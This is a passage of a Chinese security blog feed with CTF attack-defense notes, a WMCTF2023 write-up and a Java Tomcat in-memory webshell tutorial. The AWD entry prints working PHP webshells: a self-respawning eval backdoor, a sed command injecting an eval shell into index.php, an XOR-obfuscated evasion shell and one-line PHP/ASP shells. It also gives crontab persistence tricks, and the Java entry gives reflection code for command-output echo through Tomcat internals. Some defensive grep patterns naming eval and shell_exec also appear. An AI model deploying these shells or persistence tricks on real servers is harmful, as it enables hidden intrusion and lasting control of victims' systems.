src="../images/image-20230826222152051.png" alt="image-20230826222152051"></p><p><img src="../images/image-20230826222213876.png" alt="image-20230826222213876"></p><p><img src="../images/image-20230826222229090.png" alt="image-20230826222229090"></p><p>其实还有一个小问题，就是，通过命令行修改了密码之后，配置文件的requirepass字段后面的密码是不会随之修改的。</p><p><strong>上面就是服务器的数据库登录和修改密码的方法</strong>    </p><ul><li><strong>关闭一些没必要的端口</strong></li></ul><p><code>netstat -anp</code>  可以查看全部端口   和其对应的进程</p><p><code>lsof -i:xxx</code>  查看端口对应的应用程序  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">【iptable】</span><br><span class="line"></span><br><span class="line">sudo iptables -A INPUT -p tcp --dport $PORT -j DROP&quot;</span><br><span class="line">sudo iptables -A OUTPUT -p tcp --dport $PORT -j DROP&quot;   </span><br><span class="line">【kill】</span><br><span class="line">kill -9 PID&quot; (PID：进程号)</span><br><span class="line">//一般来说的话直接kill就行了 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230826225239474.png" alt="image-20230826225239474"></p><p>这是其对应数字对应的含义</p><ul><li><strong>权限维持</strong></li></ul><p>不死马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.3.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;605154ef77257bdfd9f0fa07f994e897&quot;)&#123;</span></span><br><span class="line"><span class="string">    eval($_POST[1]);</span></span><br><span class="line"><span class="string">    &#125;;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find  *.php -mmin -10</span><br><span class="line">//这个命令可以查找十分钟内被修改的代码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find xxx -type f -mtime 10 -ls</span><br><span class="line"></span><br><span class="line">//查找xx目录下10天内修改的文件</span><br><span class="line"></span><br><span class="line">find xxx -type d -mmin -30 -ls</span><br><span class="line"></span><br><span class="line">//查找xx目录下30分钟内修改过的目录</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -name &quot;*.php&quot; |xargs egrep &#x27;assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\(&#x27;</span><br><span class="line"></span><br><span class="line">//查找xxx目录下存在这x</span><br></pre></td></tr></table></figure><p>查杀这个不死马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.3.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;hi springbird !&#x27;</span>;</span><br><span class="line">    <span class="comment">//pass=pass</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;</span>);</span><br><span class="line">    <span class="comment">//    usleep(5000);</span></span><br><span class="line">          <span class="title function_ invoke__">usleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个代码是来进行查杀的</p><p>还有一种是使用软连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /flag /var/www/html/flag</span><br><span class="line">//这种的话 ls -al就会把flag给带出到/var/www/html目录下了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(echo &quot;*/2 * * * * /bin/ln -s /flag /var/www/html/flag&quot; )| crontab</span><br><span class="line"></span><br><span class="line">//这种的话就不会  因为就是这个是个定时文件  删了话还是会继续将flag给带出来的</span><br></pre></td></tr></table></figure><p><strong>下面这种就是通过写入一句话木马到指定文件中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;1 i &lt;?php &lt;span class=&quot;label label-primary&quot;&gt;@eval($REQUEST[888]);?&lt;/span&gt;&gt;&#x27; /var/www/html/index.php</span><br></pre></td></tr></table></figure><p><strong><img src="../images/image-20230828165323599.png" alt="image-20230828165323599"></strong></p><p>但是上面的容易被发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">免杀马</span><br><span class="line">&lt;?php $&#123;(chr(63)^chr(96)).(chr(60)^chr(123)).(chr(62)^chr(123)).(chr(47)^chr(123))&#125;[(chr(43)^chr(64))]($&#123;(chr(36)^chr(123)).(chr(46)^chr(126)).(chr(47)^chr(96)).(chr(46)^chr(125)).(chr(47)^chr(123))&#125;[(chr(43)^chr(64))]); ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是多几个木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php：&lt;?php &lt;span class=&quot;label label-primary&quot;&gt;@eval($_POST[&#x27;pass&#x27;]);?&lt;/span&gt;&gt;      &lt;?php eval($_GET[&#x27;pass&#x27;]); </span><br><span class="line">asp：&lt;%eval request (&quot;pass&quot;)%&gt; </span><br><span class="line">aspx：</span><br></pre></td></tr></table></figure><p>CODEqlpy的用法</p><p><img src="../images/image-20230830154032568.png" alt="image-20230830154032568"></p><p><img src="../images/image-20230830154046986.png" alt="image-20230830154046986"></p><p><img src="../images/image-20230830154056650.png" alt="image-20230830154056650"></p><p>执行完上面的步骤之后  静静的等待结果就好了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;php可以直接进行修改  不用重启服务  &lt;/p&gt;
&lt;p&gt;java需要重启 就是先将jar包下载下来  然后使用codeqlpy工具进行扫描  然后进行修改 然后编译后 将代码进行替换(就是有问题的class)  然后找到jar所在的进程(&lt;code&gt;ps aux|grep</summary>
      
    
    
    
    
    <category term="AWD" scheme="https://ke1nys.github.io/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>WMCTF2023-Web</title>
    <link href="https://ke1nys.github.io/posts/c7b9a706.html"/>
    <id>https://ke1nys.github.io/posts/c7b9a706.html</id>
    <published>2023-08-21T03:13:38.000Z</published>
    <updated>2023-08-24T07:25:41.130Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ez-blog"><a href="#ez-blog" class="headerlink" title="ez_blog"></a>ez_blog</h2><p><a href="https://www.yuque.com/dat0u/ctf/qh9i7y75udvza7ix">wp1</a>   <a href="https://blog.wm-team.cn/index.php/archives/39/#%E9%A2%84%E6%9C%9F%E8%A7%A3%E6%B3%95">wp2</a></p><p>下载附件  然后开始对<code>app.js</code>进行审计</p><p>这里<code>app.js</code>里给了注释  看起来还是比较好看的</p><h2 id="你的权限放着我来"><a href="#你的权限放着我来" class="headerlink" title="你的权限放着我来"></a>你的权限放着我来</h2><p>先进行注册 </p><p>登录后查看源码  给了一些提示和邮箱</p><p><img src="../images/image-20230821111603047.png" alt="image-20230821111603047"></p><p>经过测试发现密码找回功能能够收到邮件</p><p>收到邮件后访问该链接进行抓包  然后访问该api接口进行密码修改</p><p><img src="../images/image-20230821112142983.png" alt="image-20230821112142983"></p><p><img src="../images/image-20230821112330226.png" alt="image-20230821112330226"></p><p>这里的话email换成前面给的固定的那几个邮箱 一个一个试就可以  token得为空  不然会失败</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ez-blog&quot;&gt;&lt;a href=&quot;#ez-blog&quot; class=&quot;headerlink&quot; title=&quot;ez_blog&quot;&gt;&lt;/a&gt;ez_blog&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/dat0u/ctf/qh9i7y75u</summary>
      
    
    
    
    
    <category term="WMCTF2023-Web" scheme="https://ke1nys.github.io/tags/WMCTF2023-Web/"/>
    
  </entry>
  
  <entry>
    <title>Java-内存马回显技术</title>
    <link href="https://ke1nys.github.io/posts/c2df394f.html"/>
    <id>https://ke1nys.github.io/posts/c2df394f.html</id>
    <published>2023-08-17T09:39:25.000Z</published>
    <updated>2023-08-18T08:40:58.980Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1355">参考文章1</a></p><p><a href="https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/#SpringBoot%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98">参考文章2</a></p><h2 id="内存马回显技术"><a href="#内存马回显技术" class="headerlink" title="内存马回显技术"></a>内存马回显技术</h2><p>所谓回显，其实就是获取命令执行的结果，这种技术常用于目标机器不出网，<strong>无法反弹shell</strong>的情况。对于Java的中间件来讲，其关键就是获取request和response对象。</p><p><strong>(这里我对不出网的理解是不能进行外连(也就是无法弹shell了)，就是只能接收到外部请求)</strong></p><p>那么这种情况就只能写入内存马  并且就是得想要request对象将生成的结果带出来 (那么<code>HttpServletRequest</code>      <code>ServletRequest</code>  这种来获取request就是不行的)</p><p><img src="../images/image-20230817195118232.png" alt="image-20230817195118232"></p><h3 id="ThreadLocal-Response回显-有局限性"><a href="#ThreadLocal-Response回显-有局限性" class="headerlink" title="ThreadLocal Response回显(有局限性)"></a>ThreadLocal Response回显(有局限性)</h3><p>首先要注意的是，我们寻找的request对象应该是一个和当前线程ThreadLocal有关的对象，而不是一个全局变量。这样才能获取到当前线程的相关信息。最终我们能够在<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>类中找到这样两个变量<em><code>lastServicedRequest</code></em>和<em><code>lastServicedResponse</code></em>。并且这两个属性还是静态的，我们获取时无需实例化对象。</p><p><img src="../images/image-20230817201046129.png" alt="image-20230817201046129"></p><p><img src="../images/image-20230817201111266.png" alt="image-20230817201111266"></p><p>对这个<code>ThreadLocal&lt;ServletRequest&gt;</code>的解释</p><p><img src="../images/X1BQFCCKN(CUT27W%1H" alt="img">[41.png)</p><p>在我们熟悉的<code>ApplicationFilterChain#internalDoFilter</code>中，Tomcat会将request对象和response对象存储到这两个变量中</p><p>下了个断点来看这个<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>，这个默认是<code>False</code></p><p>所以我们要是想进行进入到里面进行操作的话  得想要反射进行修改赋值</p><p><strong>可以总结思路如下</strong>  </p><ol><li>反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>的值，通过<code>ThreadLocal#set</code>方法将request和response对象存储到变量中</li><li>初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</li><li>通过<code>ThreadLocal#get</code>方法将request和response对象从<em><code>lastServicedRequest</code></em>和<em><code>lastServicedResponse</code></em>中取出</li></ol><h4 id="反射存储request和response"><a href="#反射存储request和response" class="headerlink" title="反射存储request和response"></a>反射存储request和response</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射获取所需属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//使用modifiersField反射修改final型变量</span></span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//将变量WRAP_SAME_OBJECT_FIELD设置为true</span></span><br><span class="line"><span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>))&#123;</span><br><span class="line">    WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>(final变量并不是不可修改的)</strong></p><p>在JDK12+之后，我们就不能通过上述方法移除final修饰符了，会报错<code>NoSuchFiled:modifiers</code>，因此目前我只发现了低版本的这种回显方式</p><h4 id="初始化变量"><a href="#初始化变量" class="headerlink" title="初始化变量"></a>初始化变量</h4><p>由于变量在Tomcat初始化运行的时候会被设置为null，因此我们还需要初始化lastServicedRequest和lastServicedResponse变量为ThreadLocal类</p><p><img src="../images/image-20230817202808909.png" alt="image-20230817202808909"></p><p>上面话的意思就是这两个参数会被设置为null  我们需要自己初始化成ThreadLocal类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lastServicedRequestField.get(<span class="literal">null</span>)==<span class="literal">null</span>)&#123;</span><br><span class="line">    lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (lastServicedResponseField.get(<span class="literal">null</span>)==<span class="literal">null</span>)&#123;</span><br><span class="line">    lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取request变量"><a href="#获取request变量" class="headerlink" title="获取request变量"></a>获取request变量</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(lastServicedRequestField.get(<span class="literal">null</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">    <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> (ServletRequest) threadLocal.get();</span><br><span class="line">    System.out.println(servletRequest);</span><br><span class="line">    System.out.println((HttpServletRequest) servletRequest == req);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>(这里我就不搭建环境来进行模拟了  因为比较懒)</strong></p><h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><p>如果漏洞在ApplicationFilterChain获取回显Response代码之前，那么就无法获取到Tomcat Response进行回显。如Shiro RememberMe反序列化漏洞，因为Shiro的RememberMe功能实际上就是一个自定义的Filter。我们知道在<code>ApplicationFilterChain#internalDoFilter</code>方法中，doFilter方法实际上是在我们获取response之前的。因此在Shiro漏洞环境下我们无法通过这种方式获得回显。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                                  ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Call the next filter if there is one</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> filters[pos++];</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">...</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">                    <span class="comment">//Shiro漏洞触发点</span></span><br><span class="line">                    filter.doFilter(request, response, <span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// We fell off the end of the chain -- call the servlet instance</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//response回显触发点</span></span><br><span class="line">            <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">                lastServicedRequest.set(request);</span><br><span class="line">                lastServicedResponse.set(response);</span><br><span class="line">            &#125;</span><br><span class="line">...</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                servlet.service(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="通过全局存储Response回显"><a href="#通过全局存储Response回显" class="headerlink" title="通过全局存储Response回显"></a>通过全局存储Response回显</h3><p>Servlet容器是Java Web的核心，因此很多框架对于该容器都进行了一定程度的封装。不同框架、同一框架的不同版本的实现都有可能不同，因此我们很难找到一种通用的获取回显的方法。</p><p>比如我们上文通过ThreadLocal类来获取回显的方式就无法适用于Shiro框架下，那么我们能不能换一种思路，寻找Tomcat中全局存储的Request和Response呢？</p><p>但我们知道想要获取回显，request和response对象必须是属于当前线程的，因此通过全局存储获取回显的关键就在于找到当前代码运行的上下文和Tomcat运行上下文的联系。</p><h4 id="寻找全局Response"><a href="#寻找全局Response" class="headerlink" title="寻找全局Response"></a>寻找全局Response</h4><p>先来看一下tomcat的调用链</p><p><img src="../images/image-20230818105624386.png" alt="image-20230818105624386"></p><p>首先我们先来寻找一下Tomcat中的一些全局Response。在<code>AbstractProcessor</code>类中，我们能够找到全局response</p><p><strong>先寻找入口点  就是全局request的地方  然后再想办法来获取它</strong></p><p><img src="../images/image-20230818114526675.png" alt="image-20230818114526675"></p><p>这就是这个全部request的位置   然后跟据这个tomcat调用栈的调用顺序 来看谁调用了它  怎么进行获取</p><p>(AbstractProcessorLight是AbstractProcessor的父类)</p><p>调用了<code>Http11Processor#service</code>方法    </p><p><img src="../images/image-20230818115227852.png" alt="image-20230818115227852"></p><p><img src="../images/image-20230818115622970.png" alt="image-20230818115622970"></p><p>而<code>Http11Processor</code>继承了<code>AbstractProcessor</code>类，这里的response对象正是<code>AbstractProcessor</code>类中的属性，因此我们如果能获取到<code>Http11Processor</code>类，就能获取到response对象</p><p><img src="../images/image-20230818115919023.png" alt="image-20230818115919023"></p><p><img src="../images/image-20230818115749517.png" alt="image-20230818115749517"></p><p>那么就去寻找哪里调用了这个Http11processor  </p><p>继续分析调用栈   发现在AbstractProtocol的内部类ConnectionHandler中调用了register方法注册了processor，这里的processor就是上面的Http11processor：</p><p><img src="../images/image-20230818120349239.png" alt="image-20230818120349239"></p><p><img src="../images/image-20230818120436915.png" alt="image-20230818120436915"></p><p>我们再这一步进行跟进，在<code>register</code>方法中有一个<code>Requestinfo</code>类型的对象<code>rp</code>，他在里面也封装着一个<code>request</code>对象，之后将<code>requestinfo</code>对象存入<code>global</code>属性中：</p><p><img src="../images/image-20230818120655827.png" alt="image-20230818120655827"></p><p>所以我们尝试寻找存储了AbstractProtocol实例的地方，由于global对象是在内部类ConnectionHandler中，如果可以获取到AbstractProtocol对象，那么就能通过反射getHandler方法来获取到内部类ConnectionHandler的实例，进而获取global：既然同一个request对象都被封装进了<code>AbstractProtocol</code>的<code>global</code>属性当中，那现在需要做的就是如何找到储存了<code>AbstractProtocol</code>类的地方，只要找到了我们就可以通过反射获取（Handler是ConnectionHandler的父类）：</p><p><strong>这就是完整的思路了</strong>    </p><p>所以现在就是需要获取<code>AbstractProtocol</code>，我们继续观察调用栈，可以发现在<code>CoyoteAdapter</code>类中的connector属性中存放了<code>protocolHandler</code>对象：</p><p><img src="../images/image-20230818121455790.png" alt="image-20230818121455790"></p><p>这是AbstractProtocol和protocolHandler 的值关系</p><p><img src="../images/image-20230818150046420.png" alt="image-20230818150046420"></p><p>此时的调用链变成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connector-----&gt;Http11NioProtocol-----&gt;AbstractProtocol$ConnectoinHandler#process()-------&gt;<span class="built_in">this</span>.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response</span><br></pre></td></tr></table></figure><p>下面就是获取Connector了，Tomcat在启动时会通过StandardService创建Connector</p><p><img src="../images/image-20230818150702481.png" alt="image-20230818150702481"></p><p><code>StandardService#addConnector</code>如下，该方法会将Connector放入属性<code>connectors</code>中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addConnector</span><span class="params">(Connector connector)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">synchronized</span> (connectorsLock) &#123;</span><br><span class="line">            connector.setService(<span class="built_in">this</span>);</span><br><span class="line">            Connector results[] = <span class="keyword">new</span> <span class="title class_">Connector</span>[connectors.length + <span class="number">1</span>];</span><br><span class="line">            System.arraycopy(connectors, <span class="number">0</span>, results, <span class="number">0</span>, connectors.length);</span><br><span class="line">            results[connectors.length] = connector;</span><br><span class="line">            connectors = results;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (getState().isAvailable()) &#123;</span><br><span class="line">                connector.start();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                    sm.getString(<span class="string">&quot;standardService.connector.startFailed&quot;</span>, connector), e);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Report this property change to interested listeners</span></span><br><span class="line">        support.firePropertyChange(<span class="string">&quot;connector&quot;</span>, <span class="literal">null</span>, connector);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230818150837146.png" alt="image-20230818150837146"></p><p>最终我们的调用链如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StandardService-----&gt;Connector-----&gt;Http11NioProtocol-----&gt;AbstractProtocol$ConnectoinHandler#process()-------&gt;<span class="built_in">this</span>.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response</span><br></pre></td></tr></table></figure><p>下面的工作就是获取StandardService对象了，在此之前我们先了解一下Tomcat的类加载机制。</p><h4 id="Tomcat的类加载机制"><a href="#Tomcat的类加载机制" class="headerlink" title="Tomcat的类加载机制"></a>Tomcat的类加载机制</h4><p>这里太绕了  看不懂   感兴趣的话可以去参考文章去看</p><h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p>按照上文对调用栈分析的思路，我们可以依次构造出如下Payload</p><p><strong>(下面做的分析铺垫全是为了获取StandardService)   Tomcat的类加载机制也是讲述了如何获取StandardService</strong></p><h5 id="获取StandardContext"><a href="#获取StandardContext" class="headerlink" title="获取StandardContext"></a>获取StandardContext</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure><h5 id="获取ApplicationContext"><a href="#获取ApplicationContext" class="headerlink" title="获取ApplicationContext"></a>获取ApplicationContext</h5><p>StandardContext中没有直接的方法获取context，因此我们需要通过反射获取</p><p><img src="../images/image-20230818151629339.png" alt="image-20230818151629339"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span 